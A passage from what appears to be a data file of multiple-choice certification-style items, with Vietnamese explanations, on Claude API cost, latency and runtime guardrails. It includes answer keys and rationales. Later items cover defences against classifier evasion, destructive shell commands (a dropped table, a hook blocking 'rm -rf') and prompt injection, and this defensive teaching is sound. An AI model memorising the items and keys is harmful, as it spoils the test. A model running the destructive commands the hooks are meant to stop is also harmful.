      "Việc 1: mỗi tuần gắn nhãn 500.000 bản ghi lưu trữ, cần kết quả trong vài ngày. Việc 2: công cụ hỗ trợ nhân viên trực tiếp, phải trả lời trong vài giây.",
      "Mục tiêu: giảm chi phí mà không làm hỏng công cụ trực tiếp. Chỗ khó là ghép đúng việc với đúng đường chạy."
    ],
    asks: [
      "Quyết định nào tốt nhất?",
      "Tức là: việc nào chịu được chờ thì chuyển sang đường rẻ, việc nào cần trả lời ngay thì giữ đường thời gian thực."
    ],
    facts: [
      "Message Batches API xử lý request bất đồng bộ (asynchronous), giảm 50% giá cả token vào lẫn token ra.",
      "Đổi lại, phần lớn batch xong trong dưới 1 giờ nhưng có thể tới 24 giờ. Batch không xong trong 24 giờ thì hết hạn.",
      "Docs “Optimizing for cost and intelligence”: request nào không ai đang chờ thì đưa qua Batch API, giữ đường tương tác cho phần còn lại."
    ],
    opts: [
      { k: "A", gist: "Move the weekly tagging job to the batch interface and leave the live tool on the real-time API.",
        why: [
          "Đúng: việc gắn nhãn cần kết quả trong vài ngày, chờ tới 24 giờ vẫn dư thời gian (ý 2). 500.000 bản ghi được giảm 50% (ý 1).",
          "Công cụ trực tiếp giữ nguyên đường thời gian thực, không bị ảnh hưởng. Đúng nguyên tắc không ai chờ thì cho vào batch (ý 3)."
        ] },
      { k: "B", gist: "Move the live tool to batch and leave the weekly job on the real-time API.",
        why: [
          "Ghép ngược: việc cần trả lời trong vài giây lại đưa sang đường có thể mất tới 24 giờ (ý 2).",
          "Công cụ trực tiếp hỏng hẳn, còn việc chịu chờ được thì vẫn trả giá đầy đủ."
        ] },
      { k: "C", gist: "Move both workloads to batch, because batch costs less for everything.",
        why: [
          "Đúng là batch rẻ hơn (ý 1), nhưng kết quả bất đồng bộ, có thể chờ hàng giờ (ý 2).",
          "Nhân viên đang nói chuyện với khách không chờ được như vậy. Trái ràng buộc “without harming the live tool” (không làm hỏng công cụ trực tiếp).",
          "Dễ bị cuốn vì nhìn theo giá thì batch lúc nào cũng thắng. Nhưng đề hỏi rẻ hơn mà vẫn giữ yêu cầu độ trễ, không hỏi rẻ nhất."
        ] },
      { k: "D", gist: "Keep both on the real-time API but give the weekly job lower priority.",
        why: [
          "Không lấy được khoản giảm 50% của batch, nên chi phí gần như giữ nguyên (ý 1).",
          "Việc gắn nhãn vẫn ăn vào cùng hạn mức (rate limit) của đường thời gian thực với công cụ trực tiếp."
        ] }
    ],
    refs: [
      { label: "Docs Batch processing, mục “Batch limitations”: phần lớn batch xong trong 1 giờ, tối đa 24 giờ rồi hết hạn", href: "https://platform.claude.com/docs/en/build-with-claude/batch-processing#batch-limitations" },
      { label: "Docs Optimizing for cost and intelligence, mục “Batch work that can wait”: request không ai chờ thì đưa qua Batch API, giảm 50% mỗi token", href: "https://platform.claude.com/docs/en/about-claude/models/optimizing-for-cost-and-intelligence#batch-work-that-can-wait" }
    ]
  },
  {
    de: 1, n: 75, total: 100, sub: "6.1", subName: "Kiến trúc chi phí",
    answer: "A",
    ask: "A platform resells an AI feature to many tenants on fixed monthly plans. Last month one tenant's automated integration ran up spend far beyond its plan, and nobody noticed until the invoice arrived. Which control best addresses this?",
    scene: [
      "Nền tảng bán tính năng AI cho nhiều khách thuê (tenant), mỗi khách một gói cố định theo tháng.",
      "Một khách có tích hợp tự động chạy vượt gói rất xa, tới lúc nhận hóa đơn mới biết.",
      "Chỗ khó: vấn đề có hai nửa. Phát hiện quá muộn, và không có gì chặn lại khi vượt."
    ],
    asks: [
      "Biện pháp kiểm soát nào xử lý tốt nhất?",
      "Tức là: thấy chi phí theo từng khách gần như ngay lúc phát sinh, và có phản ứng tự động khi vượt ngân sách.",
      "Soi từng phương án theo ba câu: có đo theo từng khách không, đo có kịp không, và có chặn thật không."
    ],
    facts: [
      "Mỗi response của Messages API trả về khối <code>usage</code> với số token vào, token ra và token đọc từ cache. Ứng dụng tự ghi khối này theo từng khách thì có số đo ngay lúc gọi.",
      "Usage and Cost API của Anthropic gom theo API key, workspace, model, dữ liệu thường có sau khoảng 5 phút. Nó không biết khách thuê bên trong ứng dụng của mày, trừ khi mỗi khách dùng key hay workspace riêng.",
      "Cảnh báo (alert) chỉ báo tin. Hạn mức cứng (hard budget) mới chặn: tới ngưỡng thì giới hạn tốc độ (throttle) hoặc hạ cấp dịch vụ."
    ],
    opts: [
      { k: "A", gist: "Meter tokens and cost per tenant in real time, alert at set thresholds, and enforce a hard budget that throttles or degrades service once it is exceeded.",
        why: [
          "Đúng: đo theo từng khách ngay lúc gọi (ý 1), nên thấy vượt trong vài phút chứ không phải cuối tháng.",
          "Có đủ hai nửa: cảnh báo để người biết, hạn mức cứng để hệ thống tự chặn (ý 3). Tích hợp tự động chạy lúc nửa đêm cũng bị giữ lại."
        ] },
      { k: "B", gist: "Lower prices for all tenants so overages happen less often.",
        why: [
          "Sai: giá thấp không giới hạn lượng dùng. Tích hợp chạy vòng lặp vẫn chạy y như cũ.",
          "Mỗi lần có khách vượt, nền tảng còn lỗ nặng hơn."
        ] },
      { k: "C", gist: "Have tenants estimate their own usage in advance and rely on those estimates.",
        why: [
          "Sai: con số ước tính không chặn được gì, mà tích hợp tự động hay chạy khác hẳn dự tính.",
          "Vẫn không có đo đạc hay phản ứng tự động (ý 3), nên lần sau vẫn tới hóa đơn mới biết."
        ] },
      { k: "D", gist: "Check the provider invoice earlier each month and keep the existing monitoring.",
        why: [
          "Vẫn là phản ứng sau khi tiền đã tiêu. Hóa đơn của nhà cung cấp cũng không chia theo khách thuê của mày (ý 2).",
          "Dễ bị cuốn vì nghe như sửa đúng chỗ phát hiện muộn. Nhưng sớm hơn vài tuần vẫn là muộn, và không có gì chặn lại (ý 3)."
        ] }
    ],
    refs: [
      { label: "Docs Usage and Cost API, mục “Usage API” và “Frequently asked questions”: gom theo API key, workspace, model, dữ liệu có sau khoảng 5 phút, dùng để đặt cảnh báo ngân sách", href: "https://platform.claude.com/docs/en/manage-claude/usage-cost-api#usage-api" },
      { label: "Docs Prompt caching, mục “Tracking cache performance”: các trường đếm token trong khối usage của mỗi response", href: "https://platform.claude.com/docs/en/build-with-claude/prompt-caching#tracking-cache-performance" }
    ]
  },
  {
    de: 1, n: 76, total: 100, sub: "6.1", subName: "Kiến trúc chi phí",
    answer: "B",
    ask: "Before launch, finance wants a spend forecast for a new agent feature. A two-week pilot ran with 200 users. Which approach yields the most defensible forecast?",
    scene: [
      "Bộ phận tài chính cần dự báo chi phí cho tính năng agent mới trước khi ra mắt.",
      "Dữ liệu có sẵn: một đợt chạy thử (pilot) với 200 người dùng trong hai tuần.",
      "Chỗ khó: agent không phải một request một câu trả lời. Một việc gồm nhiều lần gọi, mỗi lần dài ngắn khác nhau, có phần trúng cache có phần không."
    ],
    asks: [
      "Cách nào cho dự báo “most defensible” (dễ bảo vệ nhất)?",
      "Tức là: dự báo dựng từ số đo thật, giải thích được từng thành phần, có khoảng dao động cho chỗ chưa chắc, và kiểm lại được sau khi ra mắt."
    ],
    facts: [
      "Giá API tính theo token, mỗi loại một giá: token vào, token ra, ghi cache (loại 5 phút bằng 1,25 lần giá vào), đọc cache (0,1 lần giá vào trên phần lớn model).",
      "Agent tốn hơn một request đơn: mỗi lượt của việc agent mặc định gửi lại cả hội thoại đang dài ra, cộng thêm token của định nghĩa tool, khối <code>tool_use</code> và <code>tool_result</code>.",
      "Docs “Optimizing for cost and intelligence”: so chi phí trên mỗi việc hoàn thành (cost per completed task), không phải trên mỗi token. Lấy việc từ log thật, ghi chi phí mỗi việc cạnh điểm chất lượng.",
      "Tỉ lệ người dùng chịu dùng (adoption) và tỉ lệ trúng cache sau ra mắt chưa biết chắc, nên dự báo cần một khoảng, không phải một con số."
    ],
    opts: [
      { k: "A", gist: "Assume cost per user will drop over time, without measuring it.",
        why: [
          "Sai: giả định không đo thì không phải dự báo. Tài chính hỏi “vì sao ra con số này” là không trả lời được.",
          "Chi phí agent còn có thể tăng khi người dùng quen tay, giao việc dài hơn. Không đo thì không biết chiều nào."
        ] },
      { k: "B", gist: "Model tasks per user multiplied by the input, output, and cache-read tokens per task measured in the pilot, include ranges for adoption and cache hit rate, and track actual spend against the model after launch.",
        why: [
          "Đúng: chi phí đi theo số token từng loại (ý 1), và pilot đo được đúng số đó trên chính tính năng này, gồm cả các lượt gọi tool (ý 2).",
          "Đơn vị là việc (task), khớp cách docs khuyên tính chi phí (ý 3). Khoảng cho adoption và cache hit nói rõ chỗ chưa chắc (ý 4).",
          "Theo dõi số thật sau ra mắt thì dự báo sửa được khi lệch, thay vì đoán một lần rồi thôi."
        ] },
      { k: "C", gist: "Take what last year's feature cost and adjust it by headcount.",
        why: [
          "Sai: tính năng khác thì cách tiêu token khác. Không có lý do chi phí agent mới đi theo tính năng cũ.",
          "Số người trong team (headcount) cũng không liên quan tới số token người dùng tiêu."
        ] },
      { k: "D", gist: "Multiply the expected request count by the list price of a single typical request.",
        why: [
          "Sai ở đơn vị: một việc agent gồm nhiều lần gọi, mỗi lần một cỡ, nên “một request điển hình” không đại diện được (ý 2).",
          "Bỏ qua luôn chuyện token đọc cache rẻ hơn hẳn token vào thường (ý 1). Con số ra lệch, mà lệch chiều nào cũng không biết.",
          "Dễ bị cuốn vì công thức gọn, nghe có số liệu. Nhưng nó dựa trên giả định sai về cách agent tiêu token."
        ] }
    ],
    refs: [
      { label: "Docs Pricing, mục “Prompt caching” và “Tool use pricing”: token vào, ra, ghi cache, đọc cache mỗi loại một giá, tool cộng thêm token", href: "https://platform.claude.com/docs/en/about-claude/pricing#prompt-caching" },
      { label: "Docs Optimizing for cost and intelligence, mục “Compare models on cost per task” và “Measure on your own workload”: tính chi phí trên mỗi việc hoàn thành, đo trên việc lấy từ log thật", href: "https://platform.claude.com/docs/en/about-claude/models/optimizing-for-cost-and-intelligence#compare-models-on-cost-per-task" }
    ]
  },
  {
    de: 1, n: 77, total: 100, sub: "6.2", subName: "Tối ưu độ trễ",
    answer: "C",
    ask: "A chat product shows nothing until the full response is ready. On long answers, users stare at a blank screen for nine seconds and say the product feels slow. Total generation time cannot be reduced much. Which change does the most for perceived latency?",
    scene: [
      "Sản phẩm chat chờ có đủ câu trả lời rồi mới hiện. Câu dài thì người dùng nhìn màn hình trống 9 giây.",
      "Ràng buộc: tổng thời gian sinh câu trả lời không giảm được bao nhiêu.",
      "Chỗ khó: đề hỏi “perceived latency” (độ trễ cảm nhận), không hỏi tổng thời gian. Cái cần đổi là lúc người dùng thấy chữ đầu tiên."
    ],
    asks: [
      "Thay đổi nào cải thiện độ trễ cảm nhận tốt nhất?",
      "Tức là: cho người dùng thấy nội dung sớm, dù tổng thời gian gần như giữ nguyên."
    ],
    facts: [
      "Đặt <code>\"stream\": true</code> thì Messages API gửi câu trả lời dần dần qua server-sent events, không chờ xong hết.",
      "Docs “Reducing latency”: streaming cho model gửi câu trả lời trước khi xong toàn bộ, cải thiện rõ độ phản hồi cảm nhận vì người dùng thấy chữ hiện ra theo thời gian thực.",
      "Time to first token (TTFT, thời gian tới token đầu tiên): từ lúc gửi prompt tới lúc model sinh token đầu. Docs nói nó đặc biệt đáng đo khi dùng streaming.",
      "<code>max_tokens</code> chỉ là trần cứng độ dài câu trả lời, chạm trần thì bị cắt. Nó không làm model sinh nhanh hơn."
    ],
    opts: [
      { k: "A", gist: "Show a longer loading animation that plays until the response finishes.",
        why: [
          "Sai: hoạt ảnh chỉ trang trí lúc chờ, người dùng vẫn đợi đủ 9 giây mới thấy nội dung.",
          "Thời gian tới nội dung đầu tiên không đổi chút nào (ý 3)."
        ] },
      { k: "B", gist: "Switch the feature to batch processing to make generation faster.",
        why: [
          "Sai hướng: batch xử lý bất đồng bộ, đổi độ trễ lấy giá rẻ. Kết quả có thể chờ hàng giờ.",
          "Với sản phẩm chat thì chậm hơn hẳn, không nhanh hơn."
        ] },
      { k: "C", gist: "Stream tokens to the UI as they are produced so users see text right after the first token, and make time to first token the key metric.",
        why: [
          "Đúng: streaming đẩy chữ ra ngay khi sinh (ý 1), người dùng thấy nội dung gần như ngay thay vì sau 9 giây (ý 2).",
          "Tổng thời gian sinh gần như không đổi, đúng ràng buộc của đề. Cái đổi là màn hình không còn trống.",
          "Đo TTFT là đo đúng thứ người dùng cảm thấy (ý 3)."
        ] },
      { k: "D", gist: "Raise max_tokens so the model can finish in one pass.",
        why: [
          "Sai: <code>max_tokens</code> là trần độ dài, không phải tốc độ (ý 4). Nâng trần không làm token nào ra sớm hơn.",
          "Dễ bị cuốn vì nghe như “cho model làm một lần cho xong”. Nhưng đề không nói câu trả lời bị cắt, và màn hình vẫn trống tới khi xong."
        ] }
    ],
    refs: [
      { label: "Docs Reducing latency, mục “How to measure latency” và “Stream responses”: định nghĩa TTFT, streaming cải thiện độ phản hồi cảm nhận", href: "https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/reduce-latency#how-to-measure-latency" },
      { label: "Docs Streaming messages: đặt stream: true để nhận câu trả lời dần dần qua server-sent events", href: "https://platform.claude.com/docs/en/build-with-claude/streaming" }
    ]
  },
  {
    de: 1, n: 78, total: 100, sub: "6.2", subName: "Tối ưu độ trễ",
    answer: "D",
    ask: "One agent step needs data from three independent internal systems. The model emits three tool_use blocks in a single response, but the harness runs them one after another, about two seconds each. What is the most direct improvement?",
    scene: [
      "Một bước của agent cần dữ liệu từ ba hệ thống nội bộ độc lập với nhau.",
      "Model đã trả về ba khối <code>tool_use</code> trong cùng một response. Nhưng harness (khung chạy agent) gọi lần lượt từng cái, mỗi cái khoảng 2 giây, cộng lại khoảng 6 giây.",
      "Chỗ khó: model đã làm đúng phần của nó. Chỗ chậm nằm ở code chạy tool."
    ],
    asks: [
      "Cải thiện trực tiếp nhất là gì?",
      "Tức là: sửa đúng chỗ đang tiêu thời gian, mà không bỏ dữ liệu nào."
    ],
    facts: [
      "Docs “Parallel tool use”: một response có thể chứa nhiều khối <code>tool_use</code>. API không quy định thứ tự chạy: mày tự chọn chạy đồng thời (<code>Promise.all</code>, <code>asyncio.gather</code>) hay lần lượt.",
      "Thao tác độc lập, chỉ đọc thường chạy song song an toàn để giảm độ trễ. Tool có tác dụng phụ, dùng chung trạng thái hay cần thứ tự thì nên chạy lần lượt.",
      "Chạy kiểu nào cũng phải trả mỗi <code>tool_use</code> một <code>tool_result</code>, gộp hết vào user message kế tiếp, khớp bằng <code>tool_use_id</code>. Tách mỗi kết quả một message là sai, còn làm Claude bớt gọi song song.",
      "Chạy đồng thời thì tổng thời gian xấp xỉ lời gọi chậm nhất (khoảng 2 giây), thay vì tổng ba lời gọi (khoảng 6 giây)."
    ],
    opts: [
      { k: "A", gist: "After the first tool call, cache the model's output and skip the other two calls.",
        why: [
          "Sai: bỏ hai lời gọi là bỏ dữ liệu từ hai hệ thống mà bước này cần.",
          "Còn trái luật mỗi <code>tool_use</code> phải có một <code>tool_result</code> (ý 3). Nhanh hơn nhưng sai việc."
        ] },
      { k: "B", gist: "Have the model request tools one by one so it gets less confused.",
        why: [
          "Sai hướng: cố tình biến ba việc độc lập thành ba lượt nối tiếp, mỗi lượt còn thêm một vòng gọi model.",
          "Model không hề bối rối: nó gọi ba tool cùng lúc, đúng như docs mô tả (ý 1)."
        ] },
      { k: "C", gist: "Move to a larger model so the tools respond faster, and keep the current monitoring.",
        why: [
          "Sai chỗ: 6 giây nằm ở việc chạy tool, không ở model. Đổi model không làm hệ thống nội bộ trả lời nhanh hơn.",
          "Dễ bị cuốn vì “model lớn hơn” nghe như nâng cấp chung. Nhưng model nào cũng phải chờ tool trả về, mà model lớn thường còn chậm và đắt hơn."
        ] },
      { k: "D", gist: "Run the independent tool calls concurrently in the harness and send all the results back together in one message.",
        why: [
          "Đúng: ba lời gọi độc lập, chỉ lấy dữ liệu, đúng loại docs nói chạy song song được (ý 1, ý 2).",
          "Tổng thời gian còn khoảng bằng lời gọi chậm nhất (ý 4). Gộp ba <code>tool_result</code> vào một user message là đúng định dạng, giữ cho Claude tiếp tục gọi song song ở các bước sau (ý 3)."
        ] }
    ],
    refs: [
      { label: "Docs Parallel tool use, mục “Execution semantics”: tự chọn chạy đồng thời hay lần lượt, mọi tool_result gộp vào một user message", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use#execution-semantics" },
      { label: "Docs Parallel tool use, mục “Troubleshooting”: tách mỗi kết quả một message làm Claude bớt gọi song song", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use#troubleshooting" }
    ]
  },
  {
    de: 1, n: 79, total: 100, sub: "6.2", subName: "Tối ưu độ trễ",
    answer: "AE",
    ask: "A reasoning-heavy agent keeps missing its 20-second p95 latency target. Profiling shows that every call spends a long time processing a 40k-token static prefix, and that simple routing steps burn a lot of time on extended reasoning. Which two actions fit best? (Choose two.)",
    scene: [
      "Agent nặng suy luận, mục tiêu p95 (95% request phải xong trong ngưỡng) là 20 giây, đang trượt.",
      "Đo đạc (profiling) chỉ ra hai chỗ: lần gọi nào cũng xử lý lại 40k token tiền tố tĩnh, và các bước điều hướng (routing) đơn giản vẫn suy luận dài.",
      "Chỗ khó: đề đã chỉ sẵn hai nút thắt. Cần chọn đúng hai cách gỡ từng nút, loại các cách nghe hợp lý mà không chạm vào nút nào."
    ],
    asks: [
      "Hai hành động nào hợp nhất?",
      "Tức là: một cách bỏ việc xử lý lại tiền tố 40k, một cách bớt suy luận ở bước đơn giản, mà không làm hỏng bước khó."
    ],
    facts: [
      "Prompt caching cho các lần gọi sau đọc lại tiền tố đã cache thay vì xử lý lại. Docs nói với tài liệu dài thường thấy time to first token cải thiện. Cache không làm đổi câu trả lời model sinh ra.",
      "Tham số effort chỉnh số token Claude bỏ ra cho cả câu trả lời, gồm cả phần suy nghĩ. Mức <code>low</code> hợp với việc đơn giản cần nhanh và rẻ, như subagent. Docs khuyên chỉnh effort theo độ khó của việc.",
      "<code>max_tokens</code> là trần cứng tổng đầu ra (cả suy nghĩ lẫn câu trả lời). Nó không làm model nhanh hơn hay tiết kiệm hơn.",
      "Batch API giảm 50% giá nhưng kết quả bất đồng bộ, có thể tới 24 giờ. Đó là đổi độ trễ lấy chi phí."
    ],
    opts: [
      { k: "A", gist: "Put a cache checkpoint after the static prefix so later calls reuse it instead of reprocessing it.",
        why: [
          "Đúng nút thắt thứ nhất: 40k token tĩnh được cache, các lần gọi sau đọc từ cache thay vì xử lý lại (ý 1).",
          "Phần xử lý prompt rời khỏi đường găng (critical path) của mỗi lần gọi, nên p95 giảm."
        ] },
      { k: "B", gist: "Increase max_tokens so the model can finish its reasoning in a single call.",
        why: [
          "Sai: đề không nói câu trả lời bị cắt, nên trần đầu ra không phải nút thắt (ý 3).",
          "Nâng trần chỉ cho suy luận dài thêm nếu model muốn. Có khi chậm hơn, không nhanh hơn."
        ] },
      { k: "C", gist: "Add automatic retries so slow responses get replaced by faster ones.",
        why: [
          "Sai: thử lại là gọi thêm một lần, cộng thêm thời gian và token. Lần gọi mới vẫn gặp đúng hai nút thắt cũ.",
          "Không chạm vào tiền tố 40k hay phần suy luận thừa. p95 có khi còn tệ hơn vì có request phải chạy hai lần."
        ] },
      { k: "D", gist: "Move every request to the batch interface to benefit from its lower cost.",
        why: [
          "Sai mục tiêu: batch rẻ hơn nhưng chậm hơn, có thể tới 24 giờ (ý 4). Đề cần giảm độ trễ.",
          "Dễ bị cuốn vì batch hay đi cùng chữ “tối ưu”. Nhưng nó tối ưu chi phí, ngược với yêu cầu p95 dưới 20 giây."
        ] },
      { k: "E", gist: "Lower the effort or thinking level on the simple routing steps and reserve high effort for the hard steps.",
        why: [
          "Đúng nút thắt thứ hai: effort quyết định model suy nghĩ bao nhiêu (ý 2). Bước điều hướng đơn giản không cần suy luận dài.",
          "Bước khó vẫn giữ effort cao, nên chỗ cần suy luận không bị ảnh hưởng. Đúng kiểu chỉnh effort theo độ khó mà docs khuyên (ý 2).",
          "Docs cũng lưu ý: đổi effort ở cấp request giữa các lượt có thể làm mất một phần cache. Model hỗ trợ đổi effort theo từng message thì giữ được cache, nên A và E đi cùng nhau được."
        ] }
    ],
    refs: [
      { label: "Docs Prompt caching, mục “Structuring your prompt”: đặt breakpoint ở cuối tiền tố tĩnh để lần gọi sau đọc lại từ cache", href: "https://platform.claude.com/docs/en/build-with-claude/prompt-caching#structuring-your-prompt" },
      { label: "Docs Effort, mục “Effort levels” và “Best practices”: low cho việc đơn giản cần nhanh, chỉnh effort theo độ khó, cẩn thận cache khi đổi effort", href: "https://platform.claude.com/docs/en/build-with-claude/effort#best-practices" }
    ]
  },
  {
    de: 1, n: 80, total: 100, sub: "7.1", subName: "Guardrail lúc chạy",
    answer: "A",
    ask: "On a customer chatbot, an input-screening classifier rejects 8% of legitimate requests and users complain, yet a red team still gets a few evasions through. The security lead wants to tune this guardrail. What should they do?",
    scene: [
      "Chatbot khách hàng có bộ phân loại sàng lọc đầu vào (input-screening classifier).",
      "Hai vấn đề ngược chiều cùng lúc: chặn nhầm 8% yêu cầu hợp lệ làm người dùng phàn nàn, và đội red team (đội tấn công thử) vẫn tìm được vài cách lách.",
      "Chỗ khó: siết thì chặn nhầm tăng, nới thì lọt nhiều hơn. Không có nút nào sửa cả hai bằng một lần vặn."
    ],
    asks: [
      "Cách tiến hành tốt nhất là gì?",
      "Tức là: chỉnh dựa trên số đo cả hai loại lỗi trên dữ liệu đại diện, rồi quyết loại lỗi nào đắt hơn với đúng bài toán này."
    ],
    facts: [
      "Dương tính giả (false positive): chặn nhầm yêu cầu hợp lệ. Âm tính giả (false negative): để lọt yêu cầu độc hại. Siết ngưỡng làm giảm loại sau nhưng tăng loại trước, và ngược lại.",
      "Docs “Define success criteria and build evaluations”: bộ đánh giá phải phản ánh phân bố việc thật, kể cả ca biên. Với guardrail, đó là mẫu lưu lượng thật có gắn nhãn cộng với ca của red team.",
      "Docs “Mitigate jailbreaks and prompt injections” gợi ý sàng lọc bằng model nhẹ, theo dõi liên tục để chỉnh dần, và xếp nhiều lớp bảo vệ (chain safeguards).",
      "Bài Constitutional Classifiers của Anthropic kể bản thử đầu chặn quá nhiều câu hỏi vô hại: an toàn hơn nhưng có thể không triển khai nổi. Bản sau giữ độ chắc gần như cũ mà giảm mạnh chặn nhầm."
    ],
    opts: [
      { k: "A", gist: "Measure false positives and false negatives on a labeled set built from real traffic and red-team cases, weigh what each error type costs in this use case, and tune thresholds or add layers to match.",
        why: [
          "Đúng: đo cả hai loại lỗi (ý 1) trên dữ liệu đại diện gồm lưu lượng thật và ca tấn công (ý 2).",
          "Cân cái giá của từng loại lỗi rồi mới chọn ngưỡng. Một ngưỡng không gỡ được thì thêm lớp, đúng kiểu xếp nhiều lớp docs gợi ý (ý 3).",
          "Khớp bài học của Constitutional Classifiers: guardrail phải vừa chắc vừa dùng được (ý 4)."
        ] },
      { k: "B", gist: "Turn off the classifier because it harms the experience and other controls are in place.",
        why: [
          "Sai: bỏ một lớp bảo vệ mà không đo gì. Có lớp này red team vẫn lách được vài lần, bỏ đi thì lọt nhiều hơn hẳn.",
          "Các lớp khác có đỡ được hay không là chuyện phải đo, không phải giả định (ý 3)."
        ] },
      { k: "C", gist: "Tighten the threshold until no attacks get through, disregarding legitimate requests that get blocked.",
        why: [
          "Sai: chỉ nhìn một loại lỗi. Siết tới mức không lọt gì thì chặn nhầm vọt lên quá 8% (ý 1).",
          "Dễ bị cuốn vì người lo bảo mật thấy “không lọt tấn công” là an toàn. Nhưng guardrail chặn khách thật hàng loạt thì sản phẩm khó sống (ý 4)."
        ] },
      { k: "D", gist: "Loosen it until the complaints stop and let the system prompt handle the rest.",
        why: [
          "Sai: chỉnh cho hết phàn nàn là bỏ qua các cách lách red team đã tìm thấy (ý 1).",
          "System prompt chỉ là lời dặn model, không phải lớp chặn cưỡng chế được. Dồn phần còn lại cho nó là bỏ ngỏ."
        ] }
    ],
    refs: [
      { label: "Docs Mitigate jailbreaks and prompt injections, mục “Jailbreaks and direct prompt injection” và “Continuous monitoring”: sàng lọc đầu vào bằng model nhẹ, theo dõi để chỉnh dần, xếp nhiều lớp", href: "https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks#jailbreaks-and-direct-prompt-injection" },
      { label: "Docs Define success criteria and build evaluations, mục “Eval design principles”: bộ đánh giá phản ánh phân bố việc thật, kể cả ca biên", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#eval-design-principles" },
      { label: "Bài Anthropic “Constitutional Classifiers”: bản đầu chặn quá nhiều câu vô hại, bản sau giữ độ chắc mà giảm chặn nhầm", href: "https://www.anthropic.com/news/constitutional-classifiers" }
    ]
  },
  {
    de: 1, n: 81, total: 100, sub: "7.1", subName: "Guardrail lúc chạy",
    answer: "D",
    ask: "A coding agent works in a developer environment and can run shell commands. On one occasion it ran a command that dropped a table in a shared staging database, even though the team's system prompt already tells it never to run destructive commands. Which control best prevents this from happening again?",
    scene: [
      "Agent viết code, có quyền chạy lệnh shell trong môi trường dev. Đã có một lần nó chạy lệnh xóa (drop) một bảng trong database staging dùng chung.",
      "System prompt đã ghi sẵn “never run destructive commands” (không bao giờ chạy lệnh phá hủy), vậy mà sự cố vẫn xảy ra.",
      "Chỗ khó: lời dặn đã có và đã thất bại. Đề muốn xem mày có còn chọn cách “dặn kỹ hơn” không."
    ],
    asks: [
      "Biện pháp nào ngăn tốt nhất để chuyện này không lặp lại?",
      "Tức là: một chốt chặn chạy trước khi lệnh được thực thi, và không phụ thuộc vào việc model có nghe lời hay không.",
      "Soi từng phương án theo hai câu: nó chặn trước hay chỉ dọn sau, và ai giữ chốt (code hay model)."
    ],
    facts: [
      "Trong Claude Code, permission rule do Claude Code thực thi, không phải do model. Docs “Configure permissions” ghi rõ: lời dặn trong prompt hay <code>CLAUDE.md</code> chỉ định hướng điều Claude cố làm, không thay đổi các luật này.",
      "Hook <code>PreToolUse</code> chạy trước khi tool được gọi và chặn được lời gọi đó: thoát với mã 2, hoặc trả <code>permissionDecision: \"deny\"</code>. Docs có sẵn ví dụ hook chặn lệnh chứa <code>rm -rf</code>.",
      "Luật quyền xét theo thứ tự deny → ask → allow, deny luôn thắng. Ask rule buộc hỏi người trước khi chạy, hợp cho các ngoại lệ cần người duyệt.",
      "Log giúp điều tra và khôi phục sau sự cố, không ngăn được lệnh chạy. Effort level chỉnh model nghĩ kỹ đến đâu, không lấy bớt tool nào."
    ],
    opts: [
      { k: "A", gist: "Record every shell command the agent runs so the team can rebuild the table afterwards.",
        why: [
          "Sai ở chỗ chỉ dọn sau: log cho biết lệnh nào đã chạy và giúp khôi phục, nhưng lệnh vẫn chạy (ý 4).",
          "Bảng vẫn bị xóa, staging vẫn gián đoạn. Đề hỏi “prevents” (ngăn chặn), không hỏi cách khôi phục."
        ] },
      { k: "B", gist: "Restate the instruction in all caps near the top of the system prompt.",
        why: [
          "Sai ở người giữ chốt: viết hoa vẫn chỉ là lời dặn cho model, không phải luật được thực thi (ý 1).",
          "Lời dặn y hệt đã có và đã thất bại một lần. Nhấn mạnh hơn có thể giảm khả năng, nhưng không bảo đảm.",
          "Dễ bị cuốn vì sửa prompt rẻ và nhanh. Nhưng đề đã cho sẵn bằng chứng là prompt không đủ."
        ] },
      { k: "C", gist: "Lower the agent's effort level so it is less inclined to run risky commands.",
        why: [
          "Sai ở giả định: hạ effort không lấy đi quyền chạy shell của agent (ý 4).",
          "Agent vẫn gọi được đúng lệnh drop đó. Không có gì bảo đảm nghĩ ít đi thì nó bớt chạy lệnh rủi ro."
        ] },
      { k: "D", gist: "A pre-tool-use hook or permission rule, enforced outside the model, that blocks destructive commands and requests to shared databases, with exceptions going through human approval.",
        why: [
          "Đúng: chặn ngay trước khi lệnh chạy, bằng hook <code>PreToolUse</code> hoặc deny rule (ý 2, ý 3).",
          "Chốt nằm ngoài model: model có hiểu sai hay bị lừa thì lệnh vẫn bị chặn (ý 1).",
          "Ngoại lệ đi qua người duyệt: việc hợp lệ vẫn làm được, chỉ là có người xác nhận trước."
        ] }
    ],
    refs: [
      { label: "Docs Configure permissions, mục “Manage permissions”: thứ tự deny → ask → allow, và permission rule do Claude Code thực thi chứ không phải model", href: "https://code.claude.com/docs/en/permissions#manage-permissions" },
      { label: "Docs Hooks, mục “How a hook resolves”: hook <code>PreToolUse</code> chặn lệnh <code>rm -rf</code> bằng <code>permissionDecision: \"deny\"</code>", href: "https://code.claude.com/docs/en/hooks#how-a-hook-resolves" },
      { label: "Docs Configure permissions, mục “Extend permissions with hooks”: hook thoát mã 2 chặn lời gọi trước cả allow rule", href: "https://code.claude.com/docs/en/permissions#extend-permissions-with-hooks" }
    ]
  },
  {
    de: 1, n: 82, total: 100, sub: "7.1", subName: "Guardrail lúc chạy",
    answer: "B",
    ask: "A data-analysis agent has to execute code the model writes and retrieve public web pages. The team wants these abilities without putting production systems or credentials at risk. Which environment design is the right fit?",
    scene: [
      "Agent phân tích dữ liệu: phải chạy code do model tự viết, và tải trang web công khai.",
      "Yêu cầu: có hai năng lực đó, nhưng không đặt hệ thống production hay credential (thông tin xác thực) vào vòng rủi ro.",
      "Chỗ khó: code do model viết là code chưa ai duyệt, trang web là nội dung không tin được. Một trang có lệnh cài cắm (prompt injection) là code đó có thể làm việc xấu."
    ],
    asks: [
      "Thiết kế môi trường nào phù hợp?",
      "Tức là: nếu code chạy sai hoặc bị lừa, nó với tới được những gì? Đáp án đúng phải là “gần như không gì ngoài việc của nó”.",
      "Soi từng phương án theo ba thứ: mạng, credential, dữ liệu."
    ],
    facts: [
      "Docs “Securely deploying AI agents”: agent có thể bị nội dung nó xử lý dẫn đi (prompt injection) hoặc tự sai. Nên dựng nhiều lớp: cô lập bằng sandbox, container hay VM, giới hạn mạng, giới hạn file.",
